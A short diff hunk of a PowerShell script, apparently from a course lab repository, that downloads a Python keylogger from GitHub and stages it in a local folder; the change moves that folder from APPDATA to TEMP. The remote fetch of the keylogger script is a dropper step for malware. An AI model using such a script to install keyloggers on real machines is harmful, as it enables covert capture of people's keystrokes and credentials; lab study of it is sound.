@@ -4,7 +4,7 @@
 $PythonKeyloggerUrl = "https://raw.githubusercontent.com/butlersl/305-lab-files/main/Keylogger/keylogger.py"
 
 $KeyloggerFileName = "keylogger.py"
-$TargetDir = Join-Path $env:APPDATA "Keylogger_App" # Use a slightly more descriptive name
+$TargetDir = Join-Path $env:TEMP "Keylogger_App" # Use a slightly more descriptive name
 $MainScriptPath = Join-Path $TargetDir $KeyloggerFileName
 
 # --- Step 1: Create Target Directory ---
